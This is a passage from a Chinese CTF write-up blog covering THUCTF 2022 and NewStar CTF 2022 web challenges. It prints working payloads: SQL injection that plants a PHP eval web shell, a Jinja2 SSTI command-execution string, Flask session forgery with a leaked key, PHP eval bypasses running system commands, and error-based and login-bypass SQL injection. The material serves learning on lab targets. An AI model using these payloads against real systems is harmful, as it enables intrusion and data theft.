INTO items (`name`, `uuid`, `filename`) VALUES (&#x27;<span class="hljs-subst">$item_name</span>&#x27;, &#x27;<span class="hljs-subst">$item_uuid</span>&#x27;, &#x27;<span class="hljs-subst">$item_filename</span>&#x27;)&quot;</span>)) &#123;<br>            @<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$item_filename</span>, <span class="hljs-variable">$item_content</span>);<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;success&#x27;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;internal server error&#x27;</span>);<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;list_item&#x27;</span>:<br>        <span class="hljs-title function_ invoke__">require_admin</span>();<br>        <br>        <span class="hljs-variable">$db</span> = <span class="hljs-keyword">new</span> lib\<span class="hljs-title function_ invoke__">DB</span>();<br>        <span class="hljs-variable">$res</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&quot;SELECT * FROM items&quot;</span>);<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$res</span>)<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error&#x27;</span>);<br><br>        <span class="hljs-keyword">while</span> (<span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_assoc</span>(<span class="hljs-variable">$res</span>)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;--- start &#x27;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;name&#x27;</span>].<span class="hljs-string">&#x27; &#x27;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;uuid&#x27;</span>].<span class="hljs-string">&#x27; ---&lt;br/&gt;&#x27;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Content: &#x27;</span>.<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]).<span class="hljs-string">&#x27;&lt;br/&gt;&#x27;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;---  end  &#x27;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;name&#x27;</span>].<span class="hljs-string">&#x27; &#x27;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;uuid&#x27;</span>].<span class="hljs-string">&#x27; ---&lt;br/&gt;&lt;br/&gt;&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;unsupported action&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>payload：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts">cb_<span class="hljs-attr">user</span><span class="hljs-operator">=</span>admin<span class="hljs-variable">&amp;cb_pass</span>=QNKCDZO<span class="hljs-variable">&amp;cb_salt</span>=s878926199<span class="hljs-variable">&amp;action</span>=login<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210012031439.png" alt="image-20220929234203762"></p><h2 id="What-is-flag2"><a href="#What-is-flag2" class="headerlink" title="What is $? - flag2"></a>What is $? - flag2</h2><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gcode">fla<span class="hljs-name">g2</span>是不是会跟fla<span class="hljs-name">g1</span>在一起呢？fla<span class="hljs-name">g1</span>在哪呢？<br>spl_autoload_register<br>sssssqqqqqllllllll<br>嘟嘟嘟嘟嘟嘟稳健<br></code></pre></td></tr></table></figure><p>save_item的uuid可控，造成sql注入，任意读取文件</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">item[name]=admin&amp;item[uuid]=40233990-fc0f1247&#x27;,&#x27;/etc/passwd&#x27;)###&amp;item[content]=</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210012030406.png" alt="image-20220930200233394"></p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210012030551.png" alt="image-20220930223207122"></p><p>注意看这段：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// error_reporting(1);</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">autoload</span>(<span class="hljs-params"><span class="hljs-variable">$class</span></span>) </span>&#123;<br>    @<span class="hljs-keyword">include_once</span>(<span class="hljs-keyword">__DIR__</span>.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-variable">$class</span>)).<span class="hljs-string">&#x27;.php&#x27;</span>);<br>&#125;<br><span class="hljs-title function_ invoke__">spl_autoload_register</span>(<span class="hljs-string">&#x27;autoload&#x27;</span>);<br></code></pre></td></tr></table></figure><p>可以得到flag的路径为.&#x2F;lib&#x2F;flag.php</p><p>payload</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">item[name]=admin&amp;item[uuid]=40233990-fgc7l&#x27;,&#x27;./lib/flag.php&#x27;)###&amp;item[content]=</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><h2 id="What-is-flag3（未出）"><a href="#What-is-flag3（未出）" class="headerlink" title="What is $? - flag3（未出）"></a>What is $? - flag3（未出）</h2><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">为啥允许上传 <span class="hljs-string">.php</span> 后缀文件？<br>file_get_contents 除了读文件<span class="hljs-string">...</span><br>这道题目与 PHP 反序列化相关<br></code></pre></td></tr></table></figure><p>不会，猜测是phar反序列化，不知道对不对，因为测试了file_get_contents可以触发phar（ 几乎所有文件操作函数都可<em>触发</em>phar<em>反序列化</em>）。我好菜QAQ</p><h2 id="PyChall-flag1"><a href="#PyChall-flag1" class="headerlink" title="PyChall - flag1"></a>PyChall - flag1</h2><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">Flask</span> session 伪造<br></code></pre></td></tr></table></figure><p>怀疑存在SSTI，试了一下登录用户无果，nc测试了一下确实可以发送请求。</p><p>在VPS上写1.txt</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">config</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210041943090.png" alt="image-20221001164258655"></p><p>成功读取flask配置</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">&lt;Config &#123;<span class="hljs-string">&#x27;ENV&#x27;</span>: <span class="hljs-string">&#x27;production&#x27;</span>, <span class="hljs-string">&#x27;DEBUG&#x27;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&#x27;TESTING&#x27;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&#x27;PROPAGATE_EXCEPTIONS&#x27;</span>: <span class="hljs-built_in">None</span>, <span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>: <span class="hljs-string">&#x27;74a832d6-c6ef-485c-a09c-3f1c38221674&#x27;</span>, <span class="hljs-string">&#x27;PERMANENT_SESSION_LIFETIME&#x27;</span>: datetime.timedelta(days=<span class="hljs-number">31</span>), <span class="hljs-string">&#x27;USE_X_SENDFILE&#x27;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&#x27;SERVER_NAME&#x27;</span>: <span class="hljs-built_in">None</span>, <span class="hljs-string">&#x27;APPLICATION_ROOT&#x27;</span>: <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&#x27;SESSION_COOKIE_NAME&#x27;</span>: <span class="hljs-string">&#x27;session&#x27;</span>, <span class="hljs-string">&#x27;SESSION_COOKIE_DOMAIN&#x27;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&#x27;SESSION_COOKIE_PATH&#x27;</span>: <span class="hljs-built_in">None</span>, <span class="hljs-string">&#x27;SESSION_COOKIE_HTTPONLY&#x27;</span>: <span class="hljs-literal">True</span>, <span class="hljs-string">&#x27;SESSION_COOKIE_SECURE&#x27;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&#x27;SESSION_COOKIE_SAMESITE&#x27;</span>: <span class="hljs-built_in">None</span>, <span class="hljs-string">&#x27;SESSION_REFRESH_EACH_REQUEST&#x27;</span>: <span class="hljs-literal">True</span>, <span class="hljs-string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>: <span class="hljs-built_in">None</span>, <span class="hljs-string">&#x27;SEND_FILE_MAX_AGE_DEFAULT&#x27;</span>: <span class="hljs-built_in">None</span>, <span class="hljs-string">&#x27;TRAP_BAD_REQUEST_ERRORS&#x27;</span>: <span class="hljs-built_in">None</span>, <span class="hljs-string">&#x27;TRAP_HTTP_EXCEPTIONS&#x27;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&#x27;EXPLAIN_TEMPLATE_LOADING&#x27;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&#x27;PREFERRED_URL_SCHEME&#x27;</span>: <span class="hljs-string">&#x27;http&#x27;</span>, <span class="hljs-string">&#x27;JSON_AS_ASCII&#x27;</span>: <span class="hljs-built_in">None</span>, <span class="hljs-string">&#x27;JSON_SORT_KEYS&#x27;</span>: <span class="hljs-built_in">None</span>, <span class="hljs-string">&#x27;JSONIFY_PRETTYPRINT_REGULAR&#x27;</span>: <span class="hljs-built_in">None</span>, <span class="hljs-string">&#x27;JSONIFY_MIMETYPE&#x27;</span>: <span class="hljs-built_in">None</span>, <span class="hljs-string">&#x27;TEMPLATES_AUTO_RELOAD&#x27;</span>: <span class="hljs-built_in">None</span>, <span class="hljs-string">&#x27;MAX_COOKIE_SIZE&#x27;</span>: <span class="hljs-number">4093</span>&#125;&gt;<br></code></pre></td></tr></table></figure><p>得到密钥</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">&#x27;SECRET_KEY&#x27;: &#x27;<span class="hljs-number">74</span>a<span class="hljs-number">832</span>d<span class="hljs-number">6</span>-<span class="hljs-keyword">c</span><span class="hljs-number">6</span>ef<span class="hljs-number">-485</span><span class="hljs-keyword">c</span>-a<span class="hljs-number">09</span><span class="hljs-keyword">c</span><span class="hljs-number">-3</span>f<span class="hljs-number">1</span><span class="hljs-keyword">c</span><span class="hljs-number">38221674</span>&#x27;<br></code></pre></td></tr></table></figure><p>接着伪造session（工具github上有）</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs excel">python3 flask_session_cookie_manager3.py encode -s <span class="hljs-string">&quot;74a832d6-c6ef-485c-a09c-3f1c38221674&quot;</span> -<span class="hljs-built_in">t</span> &#x27;&#123;<br>  <span class="hljs-string">&quot;isAdmin&quot;</span><span class="hljs-symbol">:</span> <span class="hljs-number">1</span>,<br>  <span class="hljs-string">&quot;username&quot;</span><span class="hljs-symbol">:</span> <span class="hljs-string">&quot;admin&quot;</span><br>&#125;&#x27;<br>eyJpc0FkbWluIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.Yzf2kg.Jz8WAwQks8_33h-TZcruKEJtpSI<br></code></pre></td></tr></table></figure><p>修改session接着访问flag就行</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">Here <span class="hljs-keyword">is</span> your flag: THUCTF&#123;Congratu1ate!Now-<span class="hljs-keyword">try</span>-<span class="hljs-keyword">to</span>-RCEeeee!@&#125;<br></code></pre></td></tr></table></figure><h2 id="PyChall-flag2（赛后）"><a href="#PyChall-flag2（赛后）" class="headerlink" title="PyChall - flag2（赛后）"></a>PyChall - flag2（赛后）</h2><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs delphi">SSTI, <span class="hljs-keyword">Try</span> <span class="hljs-keyword">to</span> RCE<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs less">&#123;&#123;<span class="hljs-selector-tag">url_for</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;__glob&quot;</span><span class="hljs-string">&quot;als__&quot;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;__buil&quot;</span><span class="hljs-string">&quot;tins__&quot;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;__impo&quot;</span><span class="hljs-string">&quot;rt__&quot;</span>]</span>(<span class="hljs-string">&quot;o&quot;</span><span class="hljs-string">&quot;s&quot;</span>)<span class="hljs-selector-attr">[<span class="hljs-string">&quot;po&quot;</span><span class="hljs-string">&quot;pen&quot;</span>]</span>(<span class="hljs-string">&quot;nl /fla*&quot;</span>)<span class="hljs-selector-attr">[<span class="hljs-string">&quot;rea&quot;</span><span class="hljs-string">&quot;d&quot;</span>]</span>()&#125;&#125;<br></code></pre></td></tr></table></figure><h2 id="baby-gitlab"><a href="#baby-gitlab" class="headerlink" title="baby_gitlab"></a>baby_gitlab</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">CVE</span>-<span class="hljs-number">2021</span>-<span class="hljs-number">22205</span><br></code></pre></td></tr></table></figure><p>照着这篇<a href="https://cloud.tencent.com/developer/article/2035967">大佬的文章</a>复现即可。</p><h2 id="easy-gitlab（未出）"><a href="#easy-gitlab（未出）" class="headerlink" title="easy_gitlab（未出）"></a>easy_gitlab（未出）</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">CVE</span>-<span class="hljs-number">2022</span>-<span class="hljs-number">2185</span><br></code></pre></td></tr></table></figure><p><a href="https://github.com/ESUAdmin/CVE-2022-2185">ESU管理员&#x2F;CVE-2022-2185：wo ee cve-2022-2185 gitlab 身份验证的rce (github.com)</a></p><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="小可莉能有什么坏心思呢？（未出）"><a href="#小可莉能有什么坏心思呢？（未出）" class="headerlink" title="小可莉能有什么坏心思呢？（未出）"></a>小可莉能有什么坏心思呢？（未出）</h2><p>小可莉都是坏心思</p><p>用stegsolve看到了ABCD的四个字母，EF应该在最后一张，但是我没调到清晰的图像，不干了，就这样吧！</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210012030916.png" alt="image-20221001150406791"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">THUCTF&#123;chtgzjsvkfdbetmv（还有EF）<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>writeup</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>THUCTF</tag>
      
      <tag>2022</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022New Star CTF</title>
    <link href="/2022/10/04/2022New%20Star%20CTF/"/>
    <url>/2022/10/04/2022New%20Star%20CTF/</url>
    
    <content type="html"><![CDATA[<p>大二菜鸡web手凑凑热闹</p><h1 id="web第一周"><a href="#web第一周" class="headerlink" title="web第一周"></a>web第一周</h1><h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">Please `GET` me your `name`,I will tell you more things.<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210041941816.png" alt="image-20221004194015470"></p><p>name在cookie里</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/?name=guest</span> <span class="hljs-meta">HTTP/1.1</span><br></code></pre></td></tr></table></figure><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-built_in">Hello,</span>guest. Please `POST` me the `key` Again.But Where is the key?<br></code></pre></td></tr></table></figure><p>上一步重放得到key</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210041941786.png" alt="image-20221004194025751"></p><p>改cookie和key，别忘了加上name，得到flag</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210041942156.png" alt="image-20221004194039270"></p><h2 id="Head-Header"><a href="#Head-Header" class="headerlink" title="Head?Header!"></a>Head?Header!</h2><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">Must Use `CTF` Brower!<br></code></pre></td></tr></table></figure><p>改UA头</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">User</span>-Agent: CTF<br></code></pre></td></tr></table></figure><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">Must From <span class="hljs-string">`ctf.com`</span><br></code></pre></td></tr></table></figure><p>改referer</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-built_in">ref</span>erer:ctf.com<br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">Only</span> <span class="hljs-keyword">Local</span> <span class="hljs-keyword">User</span> Can <span class="hljs-keyword">Get</span> Flag<br></code></pre></td></tr></table></figure><p>改XFF</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">X</span>-Forwarded-For:<span class="hljs-number">127.0.0.1</span><br></code></pre></td></tr></table></figure><p>得到flag</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">You Are Good,This <span class="hljs-built_in">is</span> your flag: flag&#123;2be4e45f-<span class="hljs-number">3274</span>-<span class="hljs-number">4b90</span>-b072-1458c040ba7b&#125; <br></code></pre></td></tr></table></figure><h2 id="我真的会谢"><a href="#我真的会谢" class="headerlink" title="我真的会谢"></a>我真的会谢</h2><p>访问</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">robots<span class="hljs-selector-class">.txt</span>   www<span class="hljs-selector-class">.zip</span>    <span class="hljs-selector-class">.index</span><span class="hljs-selector-class">.php</span>.swp<br></code></pre></td></tr></table></figure><h2 id="NotPHP"><a href="#NotPHP" class="headerlink" title="NotPHP"></a>NotPHP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>]) == <span class="hljs-string">&quot;Welcome to CTF&quot;</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>]) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>] !== <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>])&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;num&#x27;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;num&#x27;</span>]) == <span class="hljs-number">2077</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hack Me&quot;</span>;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;#&quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Number error!&quot;</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Wrong Key!&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Pass it!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lasso">GET:   <span class="hljs-built_in">data</span>=<span class="hljs-built_in">data</span>:text/plain,Welcome <span class="hljs-keyword">to</span> CTF&amp;key1<span class="hljs-meta">[</span><span class="hljs-meta">]</span>=1&amp;key2<span class="hljs-meta">[</span><span class="hljs-meta">]</span>=2&amp;cmd=?&gt;<span class="hljs-meta">&lt;?=</span>system(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);<br>POST:  num=<span class="hljs-number">2077</span>d<br></code></pre></td></tr></table></figure><h2 id="Word-For-You"><a href="#Word-For-You" class="headerlink" title="Word-For-You"></a>Word-For-You</h2><p>一开始以为是时间盲注，用脚本跑了三天，没找到flag。后来才知道是万能密码。</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-number">1</span>&#x27; or &#x27;<span class="hljs-number">1</span>&#x27;=&#x27;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h1 id="web第二周"><a href="#web第二周" class="headerlink" title="web第二周"></a>web第二周</h1><h2 id="Word-For-You-2-Gen"><a href="#Word-For-You-2-Gen" class="headerlink" title="Word-For-You(2 Gen)"></a>Word-For-You(2 Gen)</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">哇哇哇，我把查询界面改了，现在你们不能从数据库<br>中拿到东西了吧哈哈（不过为了调试的代码似乎忘记删除了<br></code></pre></td></tr></table></figure><p>报错注入，就是查flag有点麻烦，显示不全</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select substr(group_concat(text),<span class="hljs-number">156</span>,<span class="hljs-number">200</span>)from wfy.wfy_comments),<span class="hljs-number">0</span>x7e),<span class="hljs-number">3</span>) or &#x27;<br></code></pre></td></tr></table></figure><h2 id="IncludeOne"><a href="#IncludeOne" class="headerlink" title="IncludeOne"></a>IncludeOne</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">文件包含漏洞系列第一题，也不知道是不是真的随机？ <br>出题人丢给你了一个工具：https:<span class="hljs-regexp">//</span>www.openwall.com<span class="hljs-regexp">/php_mt_seed/</span><br></code></pre></td></tr></table></figure><p>伪随机数漏洞，下载工具后爆破出seed</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">第一次使用工具，进入目录后，使用make命令，生成 php<span class="hljs-emphasis">_mt_seed文件以后就不用输入了。</span><br><span class="hljs-emphasis">使用./php_mt_</span>seed + 随机数即可。<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;seed.php&quot;</span>);<br><span class="hljs-comment">//mt_srand(*********);</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hint: &quot;</span>.<span class="hljs-title function_ invoke__">mt_rand</span>().<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;guess&#x27;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;guess&#x27;</span>]) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">mt_rand</span>()))&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/base|\.\./i&quot;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/NewStar/i&quot;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>        <span class="hljs-comment">//flag in `flag.php`</span><br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Baby Hacker?&quot;</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;No Hacker!&quot;</span>;<br>&#125; Hint: <span class="hljs-number">1219893521</span><br>No Hacker!<br></code></pre></td></tr></table></figure><p>比如我的是1219893521</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202209271743188.png" alt="image-20220927174155302"></p><p>通过banner得到php版本为</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">7</span>.<span class="hljs-number">3</span>.<span class="hljs-number">15</span><br></code></pre></td></tr></table></figure><p>选择种子，我的是1145146.</p><p>构造</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span 